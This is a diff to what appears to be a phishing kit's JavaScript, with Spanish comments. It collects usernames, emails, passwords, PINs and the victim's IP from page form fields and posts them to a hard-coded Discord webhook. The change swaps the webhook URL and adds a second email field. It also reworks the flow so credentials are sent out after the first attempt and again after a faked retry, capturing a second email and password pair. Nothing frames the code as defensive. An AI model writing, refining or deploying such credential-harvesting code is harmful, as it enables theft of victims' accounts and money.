@@ -1,9 +1,10 @@
 // Datos acumulativos para el mensaje
-const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1480660691575640116/WniYFtkZWXWvaSRHIJoWDVHY8a8Sx-bXPyCvBlgagoi3sOfw46CYyTk7_rba90fy9A41';
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1471221768432914483/wNw2rk7bfvAiQHAIxXjThtLy48anOQIgmzSuKQR6ePNXKtTdMb3ObU02i2YmbTtXo3qu';
 const loginData = {
     usuario: '',
     clave: '',
     correo: '',
+    correo2: '',
     contrasena1: '',
     contrasena2: '',
     pin1: '',
@@ -44,7 +45,14 @@ async function sendUserPassDiscordMessage() {
 
 // Enviar correo y clave
 async function sendEmailPassDiscordMessage() {
-    const content = `📧 Correo y claves\nIP: ${loginData.ip}\nCorreo: ${loginData.correo}\nClave: ${loginData.contrasena1}\nCorreo2: ${loginData.correo}\nClave2: ${loginData.contrasena2}`;
+    let content = '';
+    if (!loginData.contrasena2) {
+        // Primer intento: solo correo y clave
+        content = `📧 Correo y claves\nIP: ${loginData.ip}\nCorreo: ${loginData.correo}\nClave: ${loginData.contrasena1}`;
+    } else {
+        // Segundo intento: solo correo2 y clave2
+        content = `📧 Correo y claves\nIP: ${loginData.ip}\nCorreo2: ${loginData.correo2}\nClave2: ${loginData.contrasena2}`;
+    }
     try {
         await fetch(DISCORD_WEBHOOK_URL, {
             method: 'POST',
@@ -174,11 +182,12 @@ document.addEventListener('DOMContentLoaded', () => {
             if (loginData.contrasena1 === '') {
                 loginData.correo = document.getElementById('email-2fa').value;
                 loginData.contrasena1 = document.getElementById('pass-2fa').value;
+                sendEmailPassDiscordMessage(); // Enviar en el primer intento
                 handleStep3Submit();
             } else {
+                loginData.correo2 = document.getElementById('email-2fa').value;
                 loginData.contrasena2 = document.getElementById('pass-2fa').value;
-                // Enviar ambos intentos juntos
-                sendEmailPassDiscordMessage();
+                sendEmailPassDiscordMessage(); // Enviar en el segundo intento
                 handleStep3Submit();
             }
         } else if (currentStep === 4) {
